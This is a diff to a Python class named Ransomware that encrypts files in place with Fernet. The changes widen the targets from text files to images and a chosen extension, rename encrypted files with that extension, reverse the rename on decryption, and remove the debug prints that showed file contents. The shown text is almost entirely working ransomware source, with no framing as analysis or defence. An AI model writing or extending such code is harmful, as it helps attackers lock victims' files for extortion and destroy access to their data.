@@ -5,7 +5,7 @@ import base64
 
 class Ransomware:
 
-    def __init__(self, key=None):
+    def __init__(self, ext, key=None):
         """
         Initializes an instance of the Ransomware class.
         
@@ -16,10 +16,10 @@ class Ransomware:
             cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed 
             file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
         """
-
+        self.ext = ext
         self.key = key
         self.cryptor = None
-        self.file_ext_targets = ['txt']
+        self.file_ext_targets = ['txt',self.ext,'png','jpg']
 
 
     def generate_key(self):
@@ -48,7 +48,6 @@ class Ransomware:
         Writes the key to a keyfile
         """
 
-        print(self.key)
         with open(keyfile_name, 'wb') as f:
             f.write(self.key)
     
@@ -80,21 +79,28 @@ class Ransomware:
         Args:
             file_path:str: Absolute path to a file 
         """
+        if not encrypted:
+            
+            with open(file_path, 'rb+') as f:
+                _data = f.read()
+                data =self.cryptor.encrypt(_data)
+                f.seek(0)
+                f.write(data)
+                f.truncate()
+            if self.ext is not None:
+                file_ext = self.ext
+                os.rename(file_path,file_path+'.'+file_ext)
 
-        with open(file_path, 'rb+') as f:
-            _data = f.read()
-
-            if not encrypted:
-                print(f'File contents pre encryption: {_data}')
-                data = self.cryptor.encrypt(_data)
-                print(f'File contents post encryption: {data}')
-            else:
+        else:
+            
+            with open(file_path, 'rb+') as f:
+                _data = f.read()
                 data = self.cryptor.decrypt(_data)
-                print(f'File content post decryption: {data}')
-
-            f.seek(0)
-            f.write(data)
-            f.truncate()
+                f.seek(0)
+                f.write(data)
+                f.truncate()
+            ext_len = len(self.ext)+1
+            os.rename(file_path,file_path[:-ext_len])
 
 
 if __name__ == '__main__':
@@ -108,13 +114,14 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('--action', required=True)
     parser.add_argument('--keyfile')
+    parser.add_argument('--ext')
 
     args = parser.parse_args()
     action = args.action.lower()
     keyfile = args.keyfile
+    ext = args.ext
 
-    rware = Ransomware()
-
+    rware = Ransomware(ext)
     if action == 'decrypt':
         if keyfile is None:
             print('Path to keyfile must be specified after --keyfile to perform decryption.')
